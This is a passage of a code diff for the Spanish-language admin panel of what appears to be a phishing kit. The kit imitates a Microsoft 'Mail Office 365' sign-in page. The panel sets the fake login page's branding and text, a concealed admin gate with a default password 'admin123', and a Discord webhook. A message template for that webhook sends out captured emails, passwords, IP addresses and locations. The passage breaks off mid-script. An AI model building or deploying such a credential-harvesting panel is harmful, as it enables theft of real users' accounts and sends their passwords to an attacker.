@@ -1,598 +1,411 @@
 <!doctype html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Panel - Mail Office 365</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-      min-height: 100vh;
-      background: #f5f5f5;
-    }
-    .app-header {
-      background: #fff;
-      border-bottom: 1px solid #e5e5e5;
-      padding: 12px 24px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      position: sticky;
-      top: 0;
-      z-index: 40;
-    }
-    .app-header .logo {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-weight: 600;
-      font-size: 18px;
-      color: #1b1b1b;
-    }
-    .app-header .logo .grid {
-      display: grid;
-      grid-template-columns: repeat(2, 3px);
-      gap: 1px;
-      width: 16px;
-      height: 16px;
-    }
-    .app-header .logo .grid div {
-      border-radius: 1px;
-    }
-    .footer-links {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      background: rgba(255,255,255,0.95);
-      backdrop-filter: blur(8px);
-      border-top: 1px solid #e5e5e5;
-      padding: 8px 16px;
-      z-index: 50;
-    }
-    .footer-links a {
-      color: #605e5c;
-      font-size: 12px;
-      text-decoration: none;
-    }
-    .footer-links a:hover { color: #0078d4; text-decoration: underline; }
-    .card {
-      background: #fff;
-      border-radius: 8px;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-      padding: 20px;
-    }
-    .btn-primary {
-      background: #0078d4;
-      color: #fff;
-      border: none;
-      padding: 8px 16px;
-      border-radius: 4px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-    }
-    .btn-primary:hover { background: #106ebe; }
-    .btn-secondary {
-      background: #f3f3f3;
-      color: #1b1b1b;
-      border: 1px solid #d1d5db;
-      padding: 8px 16px;
-      border-radius: 4px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-    }
-    .btn-secondary:hover { background: #e5e5e5; }
-    input[type="text"], input[type="url"], input[type="email"], textarea, select {
-      border: 1px solid #d1d5db;
-      border-radius: 4px;
-      padding: 8px 12px;
-      font-size: 14px;
-      width: 100%;
-      font-family: inherit;
-    }
-    input:focus, textarea:focus, select:focus {
-      outline: none;
-      border-color: #0078d4;
-      box-shadow: 0 0 0 1px #0078d4;
-    }
-    textarea { resize: vertical; min-height: 60px; }
-    label { font-size: 13px; font-weight: 500; color: #374151; margin-bottom: 4px; display: block; }
-    .form-group { margin-bottom: 16px; }
-    .form-row { display: flex; gap: 16px; }
-    .form-row > * { flex: 1; }
-    .hidden { display: none !important; }
-    .toast {
-      position: fixed;
-      bottom: 80px;
-      right: 24px;
-      background: #1b1b1b;
-      color: #fff;
-      padding: 12px 20px;
-      border-radius: 6px;
-      font-size: 14px;
-      z-index: 100;
-      animation: slideUp 0.3s ease-out;
-      max-width: 300px;
-    }
-    @keyframes slideUp {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .modal-overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.5);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 60;
-    }
-    .modal {
-      background: #fff;
-      border-radius: 8px;
-      padding: 24px;
-      max-width: 600px;
-      width: 90%;
-      max-height: 80vh;
-      overflow-y: auto;
-    }
-    .password-protected {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.8);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 100;
-    }
-    .password-protected .card {
-      max-width: 400px;
-      width: 90%;
-      text-align: center;
-    }
-    .password-protected input {
-      text-align: center;
-      margin: 16px auto;
-      display: block;
-      max-width: 240px;
-    }
-    .password-protected .btn-primary {
-      width: 100%;
-      max-width: 240px;
-      margin: 0 auto;
-      display: block;
-    }
-  </style>
+<meta charset="UTF-8" />
+<link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Panel - Mail Office 365</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"Segoe UI",system-ui,sans-serif;min-height:100vh;background:#f5f5f5;padding-bottom:48px}
+.app-header{position:sticky;top:0;z-index:40;background:#fff;border-bottom:1px solid #e5e5e5;padding:12px 24px;display:flex;align-items:center;justify-content:space-between}
+.app-header .logo{display:flex;align-items:center;gap:10px;font-weight:600;font-size:18px;color:#1b1b1b}
+.app-header .logo .grid{display:grid;grid-template-columns:repeat(2,3px);gap:1px;width:16px;height:16px}
+.app-header .logo .grid div{border-radius:1px}
+.footer-bar{position:fixed;bottom:0;left:0;right:0;background:rgba(255,255,255,.95);backdrop-filter:blur(8px);border-top:1px solid #e5e5e5;padding:8px 16px;z-index:50}
+.footer-bar .footer-inner{max-width:1200px;margin:0 auto;display:flex;flex-wrap:wrap;align-items:center;justify-content:center;gap:8px 24px}
+.footer-bar a{color:#605e5c;font-size:12px;text-decoration:none}
+.footer-bar a:hover{color:#0078d4;text-decoration:underline}
+.card{background:#fff;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.1);padding:20px}
+.card+.card{margin-top:16px}
+.btn-primary{background:#0078d4;color:#fff;border:none;padding:8px 16px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}
+.btn-primary:hover{background:#106ebe}
+.btn-secondary{background:#f3f3f3;color:#1b1b1b;border:1px solid #d1d5db;padding:8px 16px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}
+.btn-secondary:hover{background:#e5e5e5}
+input,textarea,select{border:1px solid #d1d5db;border-radius:4px;padding:8px 12px;font-size:14px;width:100%;font-family:inherit;background:#fff;color:#1b1b1b}
+input:focus,textarea:focus,select:focus{outline:none;border-color:#0078d4;box-shadow:0 0 0 1px #0078d4}
+textarea{resize:vertical;min-height:60px}
+label{font-size:13px;font-weight:500;color:#374151;margin-bottom:4px;display:block}
+.form-group{margin-bottom:16px}
+.form-row{display:flex;gap:16px}
+.form-row>*{flex:1}
+.hidden{display:none!important}
+.toast{position:fixed;bottom:64px;right:24px;background:#1b1b1b;color:#fff;padding:12px 20px;border-radius:6px;font-size:14px;z-index:100;animation:slideUp .3s ease-out;max-width:300px}
+@keyframes slideUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);display:flex;align-items:center;justify-content:center;z-index:60}
+.modal{background:#fff;border-radius:8px;padding:24px;max-width:600px;width:90%;max-height:80vh;overflow-y:auto}
+.tab-btn{padding:10px 20px;background:none;border:none;border-bottom:2px solid transparent;margin-bottom:-2px;font-size:14px;font-weight:500;color:#605e5c;cursor:pointer}
+.tab-btn:hover{color:#1b1b1b}
+.tab-btn.active{color:#0078d4;border-bottom-color:#0078d4}
+</style>
 </head>
 <body>
 
-  <!-- Header -->
-  <header class="app-header">
-    <div class="logo" id="dashboardLogo">
-      <div class="grid">
-        <div style="background:#f25022;"></div>
-        <div style="background:#7fba00;"></div>
-        <div style="background:#00bcf2;"></div>
-        <div style="background:#ffb900;"></div>
+<header class="app-header" id="appHeader">
+  <div class="logo" id="dashboardLogo">
+    <div class="grid">
+      <div id="logoColor1" style="background:#f25022"></div>
+      <div id="logoColor2" style="background:#7fba00"></div>
+      <div id="logoColor3" style="background:#00bcf2"></div>
+      <div id="logoColor4" style="background:#ffb900"></div>
+    </div>
+    <span id="dashboardLogoText">Mail Office 365</span>
+  </div>
+  <div><span style="font-size:13px;color:#605e5c" id="dashboardUserEmail">—</span></div>
+</header>
+
+<div id="mainContent" class="hidden" style="max-width:1000px;margin:0 auto;padding:24px">
+
+  <div style="margin-bottom:24px">
+    <h1 style="font-size:24px;font-weight:600;color:#1b1b1b" id="dashboardTitle">Bienvenido a tu panel</h1>
+    <p style="color:#605e5c;margin-top:4px" id="dashboardSubtitle">Administra tu página de inicio de sesión</p>
+    <p style="color:#605e5c;margin-top:12px;font-size:14px" id="dashboardWelcomeText">Bienvenido a tu panel de control.</p>
+  </div>
+
+  <div style="display:flex;border-bottom:2px solid #e5e5e5;margin-bottom:24px">
+    <button class="tab-btn active" onclick="switchTab('appearance')">Apariencia</button>
+    <button class="tab-btn" onclick="switchTab('discord')">Discord</button>
+    <button class="tab-btn" onclick="switchTab('content')">Contenido</button>
+  </div>
+
+  <div id="tab-appearance" class="tab-content">
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">Logo</h3>
+      <div class="form-group"><label>Logo (imagen URL)</label>
+        <input type="url" id="logoImage" placeholder="https://ejemplo.com/logo.png" onchange="updateSetting('logoImage',this.value)">
+        <p style="font-size:12px;color:#9ca3af;margin-top:4px">Si no se usa, se muestra el logo de colores.</p>
       </div>
-      <span id="dashboardLogoText">Mail Office 365</span>
-    </div>
-    <div>
-      <span style="font-size:13px;color:#605e5c;" id="dashboardUserEmail">usuario@ejemplo.com</span>
-    </div>
-  </header>
-
-  <!-- Main Content -->
-  <div style="max-width: 1000px; margin: 0 auto; padding: 24px; display: none; id="mainContent";">
-
-    <!-- Welcome -->
-    <div style="margin-bottom: 24px;">
-      <h1 style="font-size: 24px; font-weight: 600; color: #1b1b1b;" id="dashboardTitle">Bienvenido a tu panel</h1>
-      <p style="color: #605e5c; margin-top: 4px;" id="dashboardSubtitle">Administra tu página de inicio de sesión</p>
-    </div>
-
-    <!-- Tabs -->
-    <div style="display: flex; gap: 0; border-bottom: 2px solid #e5e5e5; margin-bottom: 24px;">
-      <button class="tab-btn" style="padding: 10px 20px; background: none; border: none; border-bottom: 2px solid transparent; margin-bottom: -2px; font-size: 14px; font-weight: 500; color: #605e5c; cursor: pointer;" onclick="switchTab('appearance')">Apariencia</button>
-      <button class="tab-btn" style="padding: 10px 20px; background: none; border: none; border-bottom: 2px solid transparent; margin-bottom: -2px; font-size: 14px; font-weight: 500; color: #605e5c; cursor: pointer;" onclick="switchTab('discord')">Discord</button>
-      <button class="tab-btn" style="padding: 10px 20px; background: none; border: none; border-bottom: 2px solid transparent; margin-bottom: -2px; font-size: 14px; font-weight: 500; color: #605e5c; cursor: pointer;" onclick="switchTab('content')">Contenido</button>
-    </div>
-
-    <!-- Tab: Appearance -->
-    <div id="tab-appearance" class="tab-content">
-      <div class="card">
-        <h3 style="font-size: 16px; font-weight: 600; margin-bottom: 16px;">Fondo del Login</h3>
-        <div class="form-group">
-          <label>Tipo de fondo</label>
-          <select id="loginBgType" onchange="updateSetting('loginBgType', this.value)">
-            <option value="color">Color</option>
-            <option value="gradient">Degradado</option>
-            <option value="image">Imagen</option>
-          </select>
+      <div class="form-row">
+        <div class="form-group"><label>Color 1</label>
+          <input type="color" id="logoColor1" value="#f25022" onchange="updateSetting('logoColor1',this.value)" style="height:40px;padding:4px">
         </div>
-        <div class="form-group" id="colorOption">
-          <label>Color de fondo</label>
-          <input type="color" id="loginBgColor" value="#0a0a1a" onchange="updateSetting('loginBgColor', this.value)" style="height: 40px; padding: 4px;">
-        </div>
-        <div class="form-group hidden" id="gradientOption">
-          <label>CSS Degradado (ej: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%))</label>
-          <input type="text" id="loginBgGradient" value="linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)" onchange="updateSetting('loginBgGradient', this.value)">
-        </div>
-        <div class="form-group hidden" id="imageOption">
-          <label>URL de la imagen de fondo</label>
-          <input type="url" id="loginBgImage" placeholder="https://ejemplo.com/fondo.jpg" onchange="updateSetting('loginBgImage', this.value)">
-          <p style="font-size:12px;color:#9ca3af;margin-top:4px;">Debe ser una URL pública accesible.</p>
+        <div class="form-group"><label>Color 2</label>
+          <input type="color" id="logoColor2" value="#7fba00" onchange="updateSetting('logoColor2',this.value)" style="height:40px;padding:4px">
         </div>
       </div>
-
-      <div class="card" style="margin-top: 16px;">
-        <h3 style="font-size: 16px; font-weight: 600; margin-bottom: 16px;">Textos del Login</h3>
-        <div class="form-group">
-          <label>Nombre del logotipo</label>
-          <input type="text" id="logoText" placeholder="Mail Office 365" onchange="updateSetting('logoText', this.value)">
+      <div class="form-row">
+        <div class="form-group"><label>Color 3</label>
+          <input type="color" id="logoColor3" value="#00bcf2" onchange="updateSetting('logoColor3',this.value)" style="height:40px;padding:4px">
         </div>
-        <div class="form-group">
-          <label>Título de la página</label>
-          <input type="text" id="pageTitle" placeholder="Iniciar sesión" onchange="updateSetting('pageTitle', this.value)">
-        </div>
-        <div class="form-group">
-          <label>Subtítulo de la página</label>
-          <input type="text" id="pageSubtitle" placeholder="Usar su cuenta." onchange="updateSetting('pageSubtitle', this.value)">
-        </div>
-        <div class="form-group">
-          <label>Texto del pie de página - Ayuda</label>
-          <input type="text" id="footerHelpText" placeholder="Ayuda" onchange="updateSetting('footerHelpText', this.value)">
-        </div>
-        <div class="form-group">
-          <label>Texto del pie de página - Términos</label>
-          <input type="text" id="footerTermsText" placeholder="Términos de uso" onchange="updateSetting('footerTermsText', this.value)">
-        </div>
-        <div class="form-group">
-          <label>Texto del pie de página - Privacidad</label>
-          <input type="text" id="footerPrivacyText" placeholder="Privacidad y cookies" onchange="updateSetting('footerPrivacyText', this.value)">
+        <div class="form-group"><label>Color 4</label>
+          <input type="color" id="logoColor4" value="#ffb900" onchange="updateSetting('logoColor4',this.value)" style="height:40px;padding:4px">
         </div>
       </div>
     </div>
 
-    <!-- Tab: Discord -->
-    <div id="tab-discord" class="tab-content hidden">
-      <div class="card">
-        <h3 style="font-size: 16px; font-weight: 600; margin-bottom: 16px;">Webhook de Discord</h3>
-        <div class="form-group">
-          <label>URL del Webhook</label>
-          <input type="url" id="discordWebhook" placeholder="https://discord.com/api/webhooks/..." onchange="updateSetting('discordWebhook', this.value)">
-          <p style="font-size:12px;color:#9ca3af;margin-top:4px;">Obtén el webhook desde Discord > Servidor > Configuración > Integraciones > Webhooks.</p>
-        </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">Fondo del Login</h3>
+      <div class="form-group"><label>Tipo de fondo</label>
+        <select id="loginBgType" onchange="updateSetting('loginBgType',this.value)">
+          <option value="color">Color</option><option value="gradient">Degradado</option><option value="image">Imagen</option>
+        </select>
       </div>
-
-      <div class="card" style="margin-top: 16px;">
-        <h3 style="font-size: 16px; font-weight: 600; margin-bottom: 16px;">Plantilla del Mensaje</h3>
-        <p style="font-size:13px;color:#605e5c;margin-bottom:8px;">Usa <code>{bracket}</code> para variables. Si está vacía, se usa la plantilla por defecto.</p>
-        <textarea id="discordTemplate" rows="10" placeholder='🔐 Nuevo inicio de sesión&#10;──────────────────────────&#10;Usuario: {email}&#10;Contraseña: {password}&#10;IP: {ip}&#10;Ciudad: {geoCity}&#10;País: {geoCountry}&#10;...&#10;Hora: {timestamp}' onchange="updateSetting('discordMessageTemplate', this.value)"></textarea>
-        <div style="margin-top: 8px; display: flex; gap: 8px;">
-          <button class="btn-secondary" onclick="document.getElementById('discordTemplate').value = ''; updateSetting('discordMessageTemplate', '');">Limpiar</button>
-          <button class="btn-secondary" onclick="loadDefaultTemplate()">Cargar plantilla por defecto</button>
-        </div>
+      <div class="form-group" id="colorOption"><label>Color de fondo</label>
+        <input type="color" id="loginBgColor" value="#0a0a1a" onchange="updateSetting('loginBgColor',this.value)" style="height:40px;padding:4px">
+      </div>
+      <div class="form-group hidden" id="gradientOption"><label>CSS Degradado</label>
+        <input type="text" id="loginBgGradient" value="linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)" onchange="updateSetting('loginBgGradient',this.value)">
+      </div>
+      <div class="form-group hidden" id="imageOption"><label>URL de imagen de fondo</label>
+        <input type="url" id="loginBgImage" placeholder="https://ejemplo.com/fondo.jpg" onchange="updateSetting('loginBgImage',this.value)">
       </div>
     </div>
 
-    <!-- Tab: Content -->
-    <div id="tab-content" class="tab-content hidden">
-      <div class="card">
-        <h3 style="font-size: 16px; font-weight: 600; margin-bottom: 16px;">Contenido del Dashboard</h3>
-        <div class="form-group">
-          <label>Título del panel</label>
-          <input type="text" id="dashboardTitleInput" placeholder="Bienvenido a tu panel" onchange="updateSetting('dashboardTitle', this.value)">
-        </div>
-        <div class="form-group">
-          <label>Subtítulo del panel</label>
-          <input type="text" id="dashboardSubtitleInput" placeholder="Administra tu página de inicio de sesión" onchange="updateSetting('dashboardSubtitle', this.value)">
-        </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">Textos del Login</h3>
+      <div class="form-group"><label>Nombre del logotipo</label>
+        <input type="text" id="logoText" value="Mail Office 365" onchange="updateSetting('logoText',this.value)">
+      </div>
+      <div class="form-group"><label>Título de la página de login</label>
+        <input type="text" id="pageTitle" value="Iniciar sesión" onchange="updateSetting('pageTitle',this.value)">
+      </div>
+      <div class="form-group"><label>Subtítulo de la página de login</label>
+        <input type="text" id="pageSubtitle" value="Usar su cuenta de Mail Office 365." onchange="updateSetting('pageSubtitle',this.value)">
+      </div>
+      <div class="form-group"><label>Placeholder del email</label>
+        <input type="text" id="emailPlaceholder" value="Correo electrónico o número de teléfono" onchange="updateSetting('emailPlaceholder',this.value)">
+      </div>
+      <div class="form-group"><label>Placeholder de la contraseña</label>
+        <input type="text" id="passwordPlaceholder" value="Contraseña" onchange="updateSetting('passwordPlaceholder',this.value)">
+      </div>
+      <div class="form-group"><label>Texto del botón "Siguiente"</label>
+        <input type="text" id="nextButtonText" value="Siguiente" onchange="updateSetting('nextButtonText',this.value)">
+      </div>
+      <div class="form-group"><label>Texto del botón "Iniciar sesión"</label>
+        <input type="text" id="loginButtonText" value="Iniciar sesión" onchange="updateSetting('loginButtonText',this.value)">
+      </div>
+      <div class="form-group"><label>Texto: ¿Olvidaste tu nombre de usuario?</label>
+        <input type="text" id="forgotUsernameText" value="¿Olvidaste tu nombre de usuario?" onchange="updateSetting('forgotUsernameText',this.value)">
+      </div>
+      <div class="form-group"><label>Texto: ¿Olvidó su contraseña?</label>
+        <input type="text" id="forgotPasswordText" value="¿Olvidó su contraseña?" onchange="updateSetting('forgotPasswordText',this.value)">
+      </div>
+      <div class="form-group"><label>Texto: ¿Es nuevo?</label>
+        <input type="text" id="newUserText" value="¿Es nuevo en Mail Office 365?" onchange="updateSetting('newUserText',this.value)">
+      </div>
+      <div class="form-group"><label>Texto: Crear una cuenta</label>
+        <input type="text" id="createAccountText" value="Crear una cuenta" onchange="updateSetting('createAccountText',this.value)">
+      </div>
+      <div class="form-group"><label>Texto: Otras formas de iniciar sesión</label>
+        <input type="text" id="otherSignInText" value="Otras formas de iniciar sesión" onchange="updateSetting('otherSignInText',this.value)">
+      </div>
+      <div class="form-group"><label>Pie de página - Ayuda</label>
+        <input type="text" id="footerHelpText" value="Ayuda" onchange="updateSetting('footerHelpText',this.value)">
+      </div>
+      <div class="form-group"><label>Pie de página - Términos</label>
+        <input type="text" id="footerTermsText" value="Términos de uso" onchange="updateSetting('footerTermsText',this.value)">
+      </div>
+      <div class="form-group"><label>Pie de página - Privacidad</label>
+        <input type="text" id="footerPrivacyText" value="Privacidad y cookies" onchange="updateSetting('footerPrivacyText',this.value)">
+      </div>
+      <div class="form-group"><label>Pie de página - Navegación privada</label>
+        <input type="text" id="footerPrivateText" value="Usa la exploración privada si este no es tu dispositivo." onchange="updateSetting('footerPrivateText',this.value)">
       </div>
     </div>
   </div>
 
-  <!-- Footer Links -->
-  <div class="footer-links" id="adminFooter">
-    <div style="max-width: 1200px; margin: 0 auto; display: flex; flex-wrap: wrap; align-items: center; justify-content: center; gap: 8px 24px;">
-      <a href="#" id="footerHelp">Ayuda</a>
-      <a href="#" id="footerTerms">Términos de uso</a>
-      <a href="#" id="footerPrivacy">Privacidad y cookies</a>
-      <span style="display: none; text-align: center; font-size: 12px;" id="footerPrivate">
-        Usa la exploración privada si este no es tu dispositivo.
-        <a href="#">Más información</a>
-      </span>
-    </div>
-  </div>
-
-  <!-- Admin Access Modal (hidden by default) -->
-  <div id="adminModal" class="modal-overlay hidden">
-    <div class="modal" style="max-width: 400px; text-align: center;">
-      <div class="grid grid-cols-2 gap-px w-8 h-8 mx-auto mb-4">
-        <div style="background:#f25022;border-radius:1px;"></div>
-        <div style="background:#7fba00;border-radius:1px;"></div>
-        <div style="background:#00bcf2;border-radius:1px;"></div>
-        <div style="background:#ffb900;border-radius:1px;"></div>
+  <div id="tab-discord" class="tab-content hidden">
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">Webhook de Discord</h3>
+      <div class="form-group"><label>URL del Webhook</label>
+        <input type="url" id="discordWebhook" placeholder="https://discord.com/api/webhooks/..." onchange="updateSetting('discordWebhook',this.value)">
+        <p style="font-size:12px;color:#9ca3af;margin-top:4px">Discord > Servidor > Configuración > Integraciones > Webhooks.</p>
       </div>
-      <h2 style="font-size:18px;font-weight:600;margin-bottom:8px;">Panel de Administración</h2>
-      <p style="font-size:13px;color:#605e5c;margin-bottom:16px;">Ingresa la contraseña para acceder</p>
-      <input type="password" id="adminPassword" placeholder="Contraseña del panel" style="text-align:center;margin:0 auto;display:block;max-width:200px;" onkeyup="if(event.key==='Enter')attemptAdminAccess()">
-      <button class="btn-primary" style="margin-top:12px;" onclick="attemptAdminAccess()">Acceder</button>
-      <p id="adminError" style="color:#dc2626;font-size:13px;margin-top:8px;display:none;"></p>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">Plantilla del Mensaje</h3>
+      <p style="font-size:13px;color:#605e5c;margin-bottom:8px">Usa <code>{bracket}</code> para variables.</p>
+      <textarea id="discordTemplate" rows="10" onchange="updateSetting('discordMessageTemplate',this.value)"></textarea>
+      <div style="margin-top:8px;display:flex;gap:8px">
+        <button class="btn-secondary" onclick="document.getElementById('discordTemplate').value='';updateSetting('discordMessageTemplate','')">Limpiar</button>
+        <button class="btn-secondary" onclick="loadDefaultTemplate()">Cargar plantilla por defecto</button>
+      </div>
     </div>
   </div>
 
-  <!-- Toast -->
-  <div id="toast" class="toast hidden">Guardado correctamente</div>
+  <div id="tab-content" class="tab-content hidden">
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">Contenido del Dashboard</h3>
+      <div class="form-group"><label>Título del panel</label>
+        <input type="text" id="dashboardTitleInput" value="Bienvenido a tu panel" onchange="updateSetting('dashboardTitle',this.value)">
+      </div>
+      <div class="form-group"><label>Subtítulo del panel</label>
+        <input type="text" id="dashboardSubtitleInput" value="Administra tu página de inicio de sesión" onchange="updateSetting('dashboardSubtitle',this.value)">
+      </div>
+      <div class="form-group"><label>Mensaje de bienvenida</label>
+        <textarea id="dashboardWelcomeText" rows="3" onchange="updateSetting('dashboardWelcomeText',this.value)">Bienvenido a tu panel de control.</textarea>
+      </div>
+      <div class="form-group"><label>Contraseña del panel de administración</label>
+        <input type="password" id="adminPassword" value="admin123" onchange="updateSetting('adminPassword',this.value)" style="margin-top:8px">
+        <p style="font-size:12px;color:#9ca3af;margin-top:4px">La cambias aquí y se aplica a la puerta de admin.</p>
+      </div>
+    </div>
+  </div>
 
-  <script>
-    // ========== CONFIGURACIÓN GLOBAL ==========
-    const DEFAULT_CONFIG = {
-      companyName: 'Mail Office 365',
-      pageTitle: 'Iniciar sesión',
-      pageSubtitle: 'Usar su cuenta de Mail Office 365.',
-      logoText: 'Mail Office 365',
-      loginBgType: 'color',
-      loginBgColor: '#0a0a1a',
-      loginBgGradient: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',
-      loginBgImage: '',
-      footerHelpText: 'Ayuda',
-      footerTermsText: 'Términos de uso',
-      footerPrivacyText: 'Privacidad y cookies',
-      footerPrivateText: 'Usa la exploración privada si este no es tu dispositivo.',
-      discordWebhook: '',
-      discordMessageTemplate: '',
-      dashboardTitle: 'Bienvenido a tu panel',
-      dashboardSubtitle: 'Administra tu página de inicio de sesión',
-      adminPassword: 'admin123',
-    };
+  <div style="margin-top:24px;text-align:center">
+    <button class="btn-secondary" onclick="exitAdmin()">Cerrar sesión del admin</button>
+  </div>
+</div>
 
-    let savedConfig = null;
-    let currentTab = 'appearance';
+<div class="footer-bar" id="footerBar">
+  <div class="footer-inner">
+    <a href="#" id="footerHelp">Ayuda</a>
+    <a href="#" id="footerTerms">Términos de uso</a>
+    <a href="#" id="footerPrivacy">Privacidad y cookies</a>
+    <span style="display:none;text-align:center;font-size:12px" id="footerPrivate">Usa la exploración privada si este no es tu dispositivo. <a href="#">Más información</a></span>
+  </div>
+</div>
 
-    async function loadConfigFromServer() {
-      try {
-        const res = await fetch('/api/config');
-        if (res.ok) {
-          const data = await res.json();
-          if (data.success && data.config) {
-            savedConfig = { ...DEFAULT_CONFIG, ...data.config };
-            return savedConfig;
-          }
-        }
-      } catch (e) {
-        console.warn('No se pudo cargar config del servidor');
-      }
-      return null;
-    }
+<div id="adminModal" class="modal-overlay hidden">
+  <div class="modal" style="max-width:400px;text-align:center">
+    <div style="display:flex;justify-content:center;margin-bottom:16px">
+      <div style="display:grid;grid-template-columns:repeat(2,3px);gap:1px;width:20px;height:20px">
+        <div id="modalLogoColor1" style="background:#f25022;border-radius:1px"></div>
+        <div id="modalLogoColor2" style="background:#7fba00;border-radius:1px"></div>
+        <div id="modalLogoColor3" style="background:#00bcf2;border-radius:1px"></div>
+        <div id="modalLogoColor4" style="background:#ffb900;border-radius:1px"></div>
+      </div>
+    </div>
+    <h2 style="font-size:18px;font-weight:600;margin-bottom:8px">Panel de Administración</h2>
+    <p style="font-size:13px;color:#605e5c;margin-bottom:16px">Ingresa la contraseña para acceder</p>
+    <input type="password" id="adminPasswordInput" placeholder="Contraseña del panel"
+      class="mt-2 block mx-auto text-center" style="max-width:240px;padding:10px;border:1px solid #d1d5db;border-radius:4px"
+      onkeyup="if(event.key==='Enter')attemptAdminAccess()">
+    <button class="btn-primary mt-3" onclick="attemptAdminAccess()" style="max-width:240px;margin:8px auto 0;display:block">Acceder</button>
+    <p id="adminError" style="color:#dc2626;font-size:13px;margin-top:12px;display:none"></p>
+  </div>
+</div>
 
-    function loadConfigFromLocalStorage() {
-      try {
-        const stored = localStorage.getItem('mailoffice365_config');
-        if (stored) {
-          savedConfig = { ...DEFAULT_CONFIG, ...JSON.parse(stored) };
-          return savedConfig;
-        }
-      } catch (e) {}
-      return null;
-    }
+<div id="toast" class="toast hidden">Guardado correctamente</div>
 
-    function getConfig() {
-      if (savedConfig) return savedConfig;
-      return DEFAULT_CONFIG;
-    }
+<script>
+const DEFAULTS={
+  logoText:'Mail Office 365',logoImage:'',logoColor1:'#f25022',logoColor2:'#7fba00',
+  logoColor3:'#00bcf2',logoColor4:'#ffb900',pageTitle:'Iniciar sesión',
+  pageSubtitle:'Usar su cuenta de Mail Office 365.',emailPlaceholder:'Correo electrónico o número de teléfono',
+  passwordPlaceholder:'Contraseña',nextButtonText:'Siguiente',loginButtonText:'Iniciar sesión',
+  forgotUsernameText:'¿Olvidaste tu nombre de usuario?',forgotPasswordText:'¿Olvidó su contraseña?',
+  newUserText:'¿Es nuevo en Mail Office 365?',createAccountText:'Crear una cuenta',
+  otherSignInText:'Otras formas de iniciar sesión',loginBgType:'color',loginBgColor:'#0a0a1a',
+  loginBgGradient:'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',loginBgImage:'',
+  footerHelpText:'Ayuda',footerTermsText:'Términos de uso',footerPrivacyText:'Privacidad y cookies',
+  footerPrivateText:'Usa la exploración privada si este no es tu dispositivo.',
+  discordWebhook:'',discordMessageTemplate:'',dashboardTitle:'Bienvenido a tu panel',
+  dashboardSubtitle:'Administra tu página de inicio de sesión',dashboardWelcomeText:'Bienvenido a tu panel de control.',
+  adminPassword:'admin123'
+};
 
-    function showToast(message) {
-      const toast = document.getElementById('toast');
-      toast.textContent = message;
-      toast.style.display = 'block';
-      setTimeout(() => { toast.style.display = 'none'; }, 2500);
-    }
+let config=null,currentTab='appearance',helpTapCount=0,privacyTapCount=0,modalVisible=false;
 
-    async function updateSetting(key, value) {
-      const cfg = getConfig();
-      cfg[key] = value;
+async function loadConfig(){
+  try{const res=await fetch('/api/config');if(res.ok){const data=await res.json();if(data.success&&data.config){config={...DEFAULTS,...data.config};return;}}}
+  catch(e){}
+  try{const stored=localStorage.getItem('mailoffice365_cfg');if(stored){config={...DEFAULTS,...JSON.parse(stored)};return;}}
+  catch(e){}
+  config={...DEFAULTS};
+}
 
-      // Guardar en servidor
-      try {
-        const res = await fetch('/api/config', {
-          method: 'PATCH',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ config: { [key]: value } })
-        });
-        const data = await res.json();
-        if (data.success) {
-          showToast('Guardado correctamente');
-          localStorage.setItem('mailoffice365_config', JSON.stringify(cfg));
-        } else {
-          showToast('Error al guardar en servidor. Se guardó localmente.');
-          localStorage.setItem('mailoffice365_config', JSON.stringify(cfg));
-        }
-      } catch (e) {
-        showToast('Error de red. Se guardó localmente.');
-        localStorage.setItem('mailoffice365_config', JSON.stringify(cfg));
-      }
-    }
+function applyConfig(){
+  const c=config;
+  document.getElementById('dashboardLogoText').textContent=c.logoText;
+  document.getElementById('dashboardTitle').textContent=c.dashboardTitle;
+  document.getElementById('dashboardSubtitle').textContent=c.dashboardSubtitle;
+  document.getElementById('dashboardWelcomeText').textContent=c.dashboardWelcomeText;
+  document.getElementById('logoColor1').style.background=c.logoColor1;
+  document.getElementById('logoColor2').style.background=c.logoColor2;
+  document.getElementById('logoColor3').style.background=c.logoColor3;
